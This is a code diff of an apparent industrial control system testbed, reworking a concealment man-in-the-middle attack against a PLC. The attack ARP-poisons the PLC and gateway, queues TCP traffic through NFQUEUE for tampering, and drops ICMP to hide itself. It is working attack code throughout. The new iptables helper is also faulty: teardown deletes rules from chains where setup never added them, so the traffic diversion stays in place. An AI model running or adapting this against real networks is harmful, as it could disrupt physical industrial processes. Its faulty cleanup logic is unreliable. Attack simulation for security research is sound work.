@@ -14,7 +14,11 @@ class Error(Exception):
     """Base class for exceptions in this module."""
 
 
-class ConcealmentAttack(SyncedAttack):
+class DirectionError(Error):
+    """Raised when the optional parameter direction does not have source or destination as value"""
+
+
+class ConcealmentMiTMAttack(SyncedAttack):
     """
     todo
 
@@ -29,6 +33,7 @@ class ConcealmentAttack(SyncedAttack):
         # Process object to handle nfqueue
         self.nfqueue_process = None
 
+
     def setup(self):
         """
         This function start the network attack.
@@ -42,13 +47,7 @@ class ConcealmentAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
-
-        os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
-                  f'--queue-num 1')
-
-        os.system('iptables -A FORWARD -p icmp -j DROP')
-        os.system('iptables -A INPUT -p icmp -j DROP')
-        os.system('iptables -A OUTPUT -p icmp -j DROP')
+        self.modify_ip_tables(True)
 
         # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
@@ -57,7 +56,7 @@ class ConcealmentAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     launch_arp_poison(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
+        self.logger.debug(f"Concealment MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
         queue_number = 1
@@ -87,16 +86,10 @@ class ConcealmentAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     restore_arp(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
+        self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
-                  f'--queue-num 1')
-
-        os.system('iptables -D FORWARD -p icmp -j DROP')
-        os.system('iptables -D INPUT -p icmp -j DROP')
-        os.system('iptables -D OUTPUT -p icmp -j DROP')
-
+        self.modify_ip_tables(False)
         self.logger.debug(f"Restored ARP")
 
         self.logger.debug("Stopping nfqueue subprocess...")
@@ -111,6 +104,24 @@ class ConcealmentAttack(SyncedAttack):
         """Polls the NetFilterQueue subprocess and sends a signal to stop it when teardown is called"""
         pass
 
+
+    @staticmethod
+    def modify_ip_tables(append=True):
+
+        if append:
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
+
+            os.system('iptables -A FORWARD -p icmp -j DROP')
+            os.system('iptables -A INPUT -p icmp -j DROP')
+            os.system('iptables -A OUTPUT -p icmp -j DROP')
+        else:
+
+            os.system(f'iptables -t mangle -D INPUT -p tcp -j NFQUEUE --queue-num 1')
+            os.system(f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num 1')
+
+            os.system('iptables -D FORWARD -p icmp -j DROP')
+            os.system('iptables -D INPUT -p icmp -j DROP')
+            os.system('iptables -D OUTPUT -p icmp -j DROP')
 
 def is_valid_file(parser_instance, arg):
     """Verifies whether the intermediate yaml path is valid."""
@@ -131,7 +142,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    attack = ConcealmentAttack(
+    attack = ConcealmentMiTMAttack(
         intermediate_yaml_path=Path(args.intermediate_yaml),
         yaml_index=args.index)
     attack.main_loop()
